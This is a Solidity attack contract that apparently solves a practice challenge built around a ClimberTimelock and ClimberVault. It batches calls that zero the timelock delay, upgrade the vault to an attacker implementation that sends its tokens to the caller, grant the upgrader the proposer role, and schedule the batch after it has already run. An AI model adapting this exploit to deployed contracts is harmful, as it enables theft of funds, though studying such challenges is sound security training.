// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";
import "hardhat/console.sol";

interface IClimberUpgrade{
    function setDataElements(bytes[] calldata _dataElements) external;
}

contract ClimberAttacker{
    using Address for address;

    ClimberTimelock private immutable climberTimelock;
    ClimberVault private immutable climberVault;
    IERC20 private immutable token;

    constructor(address payable _climberTimelock, address _climberVault, address _token){
        climberTimelock = ClimberTimelock(_climberTimelock);
        climberVault = ClimberVault(_climberVault);
        token = IERC20(_token);
    }

    function attack(address upgrade) external{
        address[] memory targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberVault);
        targets[2] = address(climberTimelock);
        targets[3] = upgrade;
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0 days);
        bytes memory upgradeData = abi.encodeWithSignature("nestedCall(address,address)", address(token), msg.sender);
        dataElements[1] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", upgrade, upgradeData);
        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", climberTimelock.PROPOSER_ROLE(), upgrade);
        dataElements[3] = abi.encodeWithSignature("scheduleAttack(address,address[],uint256[])",
         address(climberTimelock), targets, values);

        IClimberUpgrade(upgrade).setDataElements(dataElements);

        climberTimelock.execute{value: 0}(targets, values, dataElements, "0");
    }
}
